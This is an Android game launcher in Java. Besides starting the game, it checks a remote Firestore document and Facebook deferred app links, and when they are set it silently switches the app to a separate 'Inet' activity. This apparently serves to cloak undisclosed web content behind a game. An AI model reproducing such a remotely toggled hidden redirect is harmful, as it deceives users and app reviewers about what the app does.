package com.spaceplanee.spaceplanee;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Toast;

import androidx.annotation.Nullable;

import com.badlogic.gdx.backends.android.AndroidApplication;
import com.badlogic.gdx.backends.android.AndroidApplicationConfiguration;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.EventListener;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.firestore.FirebaseFirestoreException;
import com.onesignal.OneSignal;

import java.util.UUID;

public class AndroidLauncher extends AndroidApplication {

	private FirebaseSettings firebaseSettings;
	private SharedPreferences sharedPreferences;
	private String param = "";
	private FirebaseFirestore db = FirebaseFirestore.getInstance();
	private final Object LOCK = new Object();

	@Override
	protected void onCreate (Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		OneSignal.startInit(this)
				.inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
				.unsubscribeWhenNotificationsAreDisabled(true)
				.init();
		sharedPreferences = getApplicationContext().getSharedPreferences("DATA", Context.MODE_PRIVATE);
		String installID = sharedPreferences.getString("installID", null);
		if (installID == null) {
			installID = UUID.randomUUID().toString();
			sharedPreferences.edit().putString("installID", installID).apply();
		}
		facebook(this, installID);
		String karam = sharedPreferences.getString("param", "");
		assert karam != null;
		if (!karam.equals("")) {
			Intent intent = new Intent(this, Inet.class);
			startActivity(intent);
		}
		AndroidApplicationConfiguration config = new AndroidApplicationConfiguration();
		initialize(new spaceplanee(), config);
	}

	@Override
	protected void onStart(){
		super.onStart();
		sharedPreferences = getApplicationContext().getSharedPreferences("DATA", Context.MODE_PRIVATE);
		param = sharedPreferences.getString("param", "");
		String installID = sharedPreferences.getString("installID", null);

		assert param != null;
		if(param.equals("") || param.length() < 7) {
			assert installID != null;
			final DocumentReference noteRef = db.collection("TicTacToe").document(installID);
			noteRef.addSnapshotListener(new EventListener<DocumentSnapshot>() {
				@Override
				public void onEvent(@Nullable DocumentSnapshot value, @Nullable FirebaseFirestoreException error) {
					if (error != null) {
						Toast.makeText(AndroidLauncher.this, "Error while loading", Toast.LENGTH_SHORT).show();
						return;
					}
					assert value != null;
					if (value.exists()) {
						param = value.getString("name");
						String response = value.getString("response");
						if(param != null && response != null) {
                            Intent intent = new Intent(AndroidLauncher.this, Inet.class);
                            sharedPreferences.edit().putString("param", param).apply();
                            startActivity(intent);
                        }
					}
				}
			});
		}
	}

	private void facebook(final Context context, final String installID) {
		FacebookSdk.setAutoInitEnabled(true);
		firebaseSettings = new FirebaseSettings();
		FacebookSdk.fullyInitialize();
		synchronized (LOCK){
			AppLinkData.fetchDeferredAppLinkData(this,
					new AppLinkData.CompletionHandler() {
						@Override
						public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
							if (appLinkData != null) {
                                Intent intent = new Intent(AndroidLauncher.this, Inet.class);
                                Uri targetUri = appLinkData.getTargetUri();
                                assert targetUri != null;
                                firebaseSettings.storeUpload(context, targetUri.toString());
                                intent.putExtra("id", installID);
                                startActivity(intent);
                            }
						}
					}
			);
		}
		synchronized (LOCK){
			firebaseSettings.storeUpload(this, "");
		}
	}
}
